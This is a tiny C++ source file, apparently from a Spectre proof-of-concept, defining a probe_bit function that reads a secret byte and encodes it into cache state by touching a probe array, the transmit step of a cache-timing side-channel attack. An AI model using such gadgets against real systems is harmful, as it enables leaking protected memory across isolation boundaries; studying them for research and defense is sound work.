#include "spectre_direct.h"

void spectre::Direct::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
    uint8_t value = *data;
    volatile uint8_t tmp = cache_probe[(mask & value) * CACHE_LINE_SIZE];
}
